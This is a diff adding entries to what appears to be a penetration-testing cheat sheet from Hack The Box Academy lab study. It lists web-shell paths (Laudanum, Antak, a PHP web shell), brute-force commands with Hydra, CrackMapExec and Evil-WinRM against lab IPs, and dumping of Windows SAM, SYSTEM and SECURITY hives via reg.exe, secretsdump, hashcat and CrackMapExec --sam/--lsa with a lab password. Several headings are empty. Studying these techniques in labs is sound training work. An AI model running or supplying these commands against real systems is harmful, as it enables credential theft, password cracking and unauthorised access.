@@ -665,9 +665,90 @@ sudo -l
 ```
 
 ## Web Shells
+### Laudanum
+```
+cp /usr/share/webshells/laudanum/aspx/shell.aspx 
+```
+### Antak
+```
+/usr/share/nishang/Antak-WebShell
+```
+### PHP Web Shells
+```
+https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+```
 
 # Password Attacks
+## Remote Password Attacks
+### Network Services
+#### CrackMapExec
+```
+crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+```
+```
+crackmapexec winrm 10.129.42.197 -u user.list -p password.list
+```
+#### Evil-WinRM
+```
+evil-winrm -i <target-IP> -u <username> -p <password>
+```
+```
+evil-winrm -i 10.129.42.197 -u user -p password
+```
+#### Hydra - SSH
+```
+hydra -L user.list -P password.list ssh://10.129.42.197
+```
+#### Hydra - RDP
+```
+hydra -L user.list -P password.list rdp://10.129.42.197
+```
+#### Hydra - SMB
+```
+hydra -L user.list -P password.list smb://10.129.42.197
+```
 
+### Default Credentials
+```
+https://github.com/ihebski/DefaultCreds-cheat-sheet
+```
+
+## Windows Local Password Attacks
+### Attacking SAM
+#### Using reg.exe and secretsdump.py
+```
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.tx
+```
+#### Using CrackMapExec
+```
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+
+### Attacking LSASS
+### Attacking Active Directory and NTDS.dit
+### Credential Hunting
+
+## Linux Local Password Attacks
+### Credential Hunting in Linux
+### Passwd, SHadow, Opasswd
+
+## Windows Lateral Movement
+### Pass the Hash
+### Pass the Ticket - Windows
+### Pass the Ticket - Linux
+
+## Cracking Files
+### Protected Files
+### Protected Archives
+
+## Password Management
+### Password Policies
+### Password Managers
 # Attacking Common Services
 
 # Pivoting, Tunneling, and Port Forwarding
